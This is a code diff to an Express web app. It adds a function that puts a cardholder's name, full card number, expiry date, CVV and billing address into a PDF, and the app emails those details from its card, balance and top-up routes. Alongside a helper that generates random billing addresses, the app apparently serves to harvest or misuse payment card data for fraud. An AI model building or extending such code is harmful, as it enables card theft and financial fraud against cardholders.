@@ -25,6 +25,26 @@ function generateBillingAddress() {
     return `${streetAddress}, ${city}, ${state} ${zip}`;
 }
 
+// Function to generate a PDF with card information
+async function generatePDF(cardName, cardNumber, expiryDate, cvv, billingAddress) {
+    const doc = new jsPDF();
+
+    // Add cardholder details
+    doc.setFont('helvetica', 'bold');
+    doc.setFontSize(16);
+    doc.text(`Cardholder Name: ${cardName}`, 20, 30);
+    doc.setFontSize(14);
+    doc.text(`Card Number: ${cardNumber.replace(/(.{4})/g, '$1 ')}`, 20, 40);
+    doc.text(`Expiry Date: ${expiryDate}`, 20, 50);
+    doc.text(`CVV: ${cvv}`, 20, 60);
+    doc.text(`Billing Address: ${billingAddress}`, 20, 80);
+
+    // Save the PDF
+    const pdfPath = path.join(__dirname, 'card-information.pdf');
+    await doc.save(pdfPath);
+    return pdfPath;
+}
+
 // Render the homepage
 app.get('/', (req, res) => {
     res.render('homepage');
@@ -32,7 +52,7 @@ app.get('/', (req, res) => {
 
 // Render the card form
 app.get('/card', (req, res) => {
-    res.render('form');
+    res.render('form', { showButtons: true });
 });
 
 // Handle card form submission
@@ -84,7 +104,7 @@ app.post('/submit', async (req, res) => {
     try {
         await transporter.sendMail(mailOptions);
         fs.unlinkSync(pdfPath); // Delete the PDF after sending
-        res.send('<script>alert("Email sent successfully!"); window.location="/";</script>');
+        res.redirect('/success'); // Redirect to success page
     } catch (error) {
         console.error(error);
         res.status(500).send('<script>alert("Error sending email."); window.location="/";</script>');
@@ -137,7 +157,7 @@ app.post('/send-balance', async (req, res) => {
 
     try {
         await transporter.sendMail(mailOptions);
-        res.send('<script>alert("Balance email sent successfully!"); window.location="/balance";</script>');
+        res.redirect('/success'); // Redirect to success page
     } catch (error) {
         console.error(error);
         res.status(500).send('<script>alert("Error sending balance email."); window.location="/balance";</script>');
@@ -187,11 +207,16 @@ app.post('/send-topup', async (req, res) => {
 
     try {
         await transporter.sendMail(mailOptions);
-        res.send('<script>alert("Top-up email sent successfully!"); window.location="/topup";</script>');
+        res.redirect('/success'); // Redirect to success page
     } catch (error) {
         console.error(error);
         res.status(500).send('<script>alert("Error sending top-up email."); window.location="/topup";</script>');
     }
+});
+
+// Render the success page
+app.get('/success', (req, res) => {
+    res.render('success');
 });
 
 // Start the server
